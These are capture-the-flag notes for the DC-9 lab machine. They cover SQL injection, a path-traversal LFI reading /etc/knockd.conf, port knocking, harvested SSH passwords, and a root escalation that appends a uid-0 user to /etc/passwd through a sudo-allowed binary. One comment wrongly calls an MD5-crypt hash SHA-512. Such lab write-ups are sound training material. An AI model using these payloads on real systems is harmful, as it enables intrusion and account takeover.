# DC-9: Machine Notes

## Recon

### Nmap
- Port 80/tcp: HTTP (Apache 2.4.38)
- Port 22/tcp: Filtered (requires port knocking)

### Web Enumeration
- Vulnerability: **SQL Injection** on `results.php` (POST parameter `search`).
- Database: `users`
- Table: `UserDetails`
- Columns: `id, firstname, lastname, username, password, reg_date`
- Credential leak: `admin` : `856f5de590ef37314e7c3bdf6f8a66dc` (MD5 -> `transorbital1`).

### LFI Discovery
- Vulnerability: **LFI** on `welcome.php` (via `file` parameter).
- Exploit: `http://[IP]/welcome.php?file=../../../../etc/knockd.conf`
- Found **Port Knocking** configuration:
```conf
[openSSH]
sequence = 7469,8475,9842
seq_timeout = 25
command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

## Initial Access

### Port Knocking
- Send sequence to open SSH:
```bash
nmap -Pn -p 7469 [IP]
nmap -Pn -p 8475 [IP]
nmap -Pn -p 9842 [IP]
```
- Port 22/tcp is now open.

### Credential Harvesting
- Logged in as `janitor` (credentials found in DB or guessed).
- Found `.secrets-for-putin/passwords-found-on-post-it-notes.txt`:
```
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```
- Brute forced SSH using combined username/password lists:
  - `fredf` : `B4-Tru3-001`
  - `chandlerb` : `UrAG0D!`
  - `joeyt` : `Passw0rd`
  - `janitor` : `Ilovepeepee`

## Privilege Escalation

### Sudo Abuse (Custom Binary)
- `sudo -l` for `fredf`:
  - `(root) NOPASSWD: /opt/devstuff/dist/test/test`
- The binary `/opt/devstuff/dist/test/test` is a compiled version of `test.py`:
```python
import sys
# ...
f = open(sys.argv[1], "r")
output = f.read()
f = open(sys.argv[2], "a") # Opens for appending
f.write(output)
f.close()
```

### Exploit: Appending to /etc/passwd
- Create a new root-level user payload:
```bash
# Generate SHA-512 hash for password 'password'
openssl passwd -1 -salt salt password 
# Payload: toor:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash
echo 'toor:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash' > /tmp/root_user
```
- Use the vulnerable binary to append to `/etc/passwd`:
```bash
sudo /opt/devstuff/dist/test/test /tmp/root_user /etc/passwd
```
- Switch to the new root user:
```bash
su toor
# Password: password
```
- Result: **Root shell**.
